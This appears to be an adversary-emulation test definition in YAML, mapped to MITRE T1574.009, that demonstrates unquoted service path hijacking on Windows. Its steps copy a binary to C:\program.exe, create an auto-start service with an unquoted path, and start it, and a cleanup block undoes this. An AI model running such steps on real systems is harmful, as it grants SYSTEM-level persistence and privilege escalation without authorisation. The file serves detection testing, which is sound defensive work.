api_version: "2.0"
name: Execution of program.exe as service with unquoted service path
description: |
    When a service is created whose executable path contains spaces and isnâ€™t enclosed within quotes, leads to a vulnerability
    known as Unquoted Service Path which allows a user to gain SYSTEM privileges.
    In this case, if an executable program.exe in C:\ exists, C:\program.exe will be executed instead of test.exe in C:\Program Files\subfolder\test.exe.
args:
    - name: service_executable
      type: path
      default: PathToAtomicsFolder\T1574.009\bin\WindowsServiceExample.exe
uuid: 2770dea7-c50f-457b-84c4-c40a47460d9f
mitre:
    tactics:
        - 'TA0003: Persistence'
        - 'TA0004: Privilege Escalation'
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1574: Hijack Execution Flow'
    subtechniques:
        - 'T1574.009: Path Interception by Unquoted Path'
requirements:
    platforms:
        - os: windows
steps:
    - name: execution-of-program.exe-as-service-with-unquoted-service-path
      inline: |
        copy "{{.Args.service_executable}}" "C:\Program Files\windows_service.exe"
        copy "{{.Args.service_executable}}" "C:\program.exe"
        sc create "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname= "Example Service" start= auto
        sc start "Example Service"
      executor: command_prompt
      cleanup:
        inline: |
            sc stop "Example Service" >nul 2>&1
            sc delete "Example Service" >nul 2>&1
            del "C:\Program Files\windows_service.exe" >nul 2>&1
            del "C:\program.exe" >nul 2>&1
            del "C:\Time.log" >nul 2>&1
        executor: command_prompt
